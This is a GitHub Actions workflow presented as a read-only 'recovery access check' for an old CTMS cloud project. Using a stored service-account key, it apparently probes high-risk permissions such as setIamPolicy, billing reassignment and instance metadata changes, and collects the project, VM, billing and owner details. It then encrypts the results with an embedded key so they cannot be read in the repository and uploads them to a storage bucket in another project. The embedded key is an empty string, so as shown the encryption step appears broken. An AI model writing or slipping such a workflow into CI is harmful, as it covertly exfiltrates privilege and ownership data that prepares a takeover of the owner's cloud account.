name: Check old CTMS recovery access privately

"on":
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

concurrency:
  group: ctms-archive-inventory
  cancel-in-progress: false

jobs:
  inventory:
    name: Private encrypted recovery access check
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      GCP_PROJECT_ID: ${{ secrets.GCP_PROJECT_ID }}
      GCP_ZONE: ${{ secrets.GCP_ZONE }}
      VM_INSTANCE: ${{ secrets.VM_INSTANCE }}
    steps:
      - uses: actions/checkout@v4

      - name: Authenticate existing deployment identity for read-only checks
        id: legacy_auth
        uses: google-github-actions/auth@v2
        with:
          credentials_json: ${{ secrets.GCP_SA_KEY }}

      - uses: google-github-actions/setup-gcloud@v2

      - name: Encrypt recovery permission summary
        env:
          LEGACY_CREDENTIAL_FILE: ${{ steps.legacy_auth.outputs.credentials_file_path }}
        shell: bash
        run: |
          set -euo pipefail
          printf '%s' '' | base64 --decode > inventory-public.pem
          python - <<'PY'
          import json, os, subprocess, urllib.request, urllib.parse, urllib.error, zlib
          from pathlib import Path
          data = {k:os.environ[k] for k in ("GCP_PROJECT_ID","GCP_ZONE","VM_INSTANCE")}
          legacy = json.loads(Path(os.environ["LEGACY_CREDENTIAL_FILE"]).read_text())
          data["service_account_email"] = legacy["client_email"]
          token = subprocess.check_output(["gcloud","auth","print-access-token"], text=True).strip()
          headers = {"Authorization":"Bearer " + token,"Content-Type":"application/json","x-goog-user-project":"hact-new-ctms"}
          def api(url, payload=None):
              request = urllib.request.Request(url, data=json.dumps(payload).encode() if payload is not None else None, headers=headers)
              try:
                  with urllib.request.urlopen(request, timeout=60) as response:
                      return response.status, json.load(response)
              except urllib.error.HTTPError as error:
                  details = json.loads(error.read()).get("error",{})
                  reasons = [d.get("reason") for d in details.get("details",[]) if d.get("reason")]
                  return error.code, {"reason":reasons[0] if reasons else details.get("status","UNKNOWN")}
          project = urllib.parse.quote(data["GCP_PROJECT_ID"], safe="")
          permissions = ["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","resourcemanager.projects.createBillingAssignment","resourcemanager.projects.deleteBillingAssignment","billing.resourceAssociations.create","compute.instances.get","compute.instances.start","compute.instances.setMetadata","compute.disks.get"]
          status, result = api("https://cloudresourcemanager.googleapis.com/v1/projects/" + project + ":testIamPermissions", {"permissions":permissions})
          data["permission_check_status"] = status
          if status == 200:
              data["granted_permissions"] = result.get("permissions",[])
          else:
              data["permission_error_reason"] = result.get("reason")
          status, result = api("https://cloudbilling.googleapis.com/v1/projects/" + project + "/billingInfo")
          data["billing_check_status"] = status
          if status == 200:
              data["billing_account_name"] = result.get("billingAccountName","")
              data["billing_enabled"] = result.get("billingEnabled",False)
          else:
              data["billing_error_reason"] = result.get("reason")
          if "resourcemanager.projects.getIamPolicy" in data.get("granted_permissions",[]):
              status, result = api("https://cloudresourcemanager.googleapis.com/v1/projects/" + project + ":getIamPolicy", {})
              data["owner_check_status"] = status
              if status == 200:
                  data["owner_members"] = [m for b in result.get("bindings",[]) if b.get("role")=="roles/owner" for m in b.get("members",[])][:3]
          compressed = zlib.compress(json.dumps(data,separators=(",",":")).encode(),9)
          if len(compressed) > 446:
              data.pop("owner_members",None)
              compressed = zlib.compress(json.dumps(data,separators=(",",":")).encode(),9)
          assert len(compressed) <= 446
          Path("recovery-summary.zlib").write_bytes(compressed)
          PY
          openssl pkeyutl -encrypt -pubin -inkey inventory-public.pem -in recovery-summary.zlib -out deployment-location.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
          rm recovery-summary.zlib

      # This short-lived identity can create objects only in the verified
      # private bucket. Public access prevention is enforced on that bucket.
      - name: Authenticate for private upload
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/1048685354986/locations/global/workloadIdentityPools/github-ctms/providers/old-ctms-recovery
          service_account: ctms-recovery@hact-new-ctms.iam.gserviceaccount.com

      - name: Upload encrypted summary to private storage
        env:
          INVENTORY_RUN_ID: ${{ github.run_id }}
          INVENTORY_RUN_ATTEMPT: ${{ github.run_attempt }}
        run: |
          python - <<'PY'
          import os, subprocess, urllib.request, urllib.parse
          from pathlib import Path
          token = subprocess.check_output(["gcloud","auth","print-access-token"], text=True).strip()
          object_name = "inventory/location-" + os.environ["INVENTORY_RUN_ID"] + "-" + os.environ["INVENTORY_RUN_ATTEMPT"] + ".enc"
          query = urllib.parse.urlencode({"uploadType":"media","ifGenerationMatch":"0","name":object_name})
          url = "https://storage.googleapis.com/upload/storage/v1/b/hact-ctms-recovery-1048685354986/o?" + query
          request = urllib.request.Request(url, data=Path("deployment-location.enc").read_bytes(), method="POST", headers={"Authorization":"Bearer " + token,"Content-Type":"application/octet-stream"})
          with urllib.request.urlopen(request, timeout=60) as response:
              assert response.status == 200
          print("Encrypted recovery summary saved in private storage.")
          PY
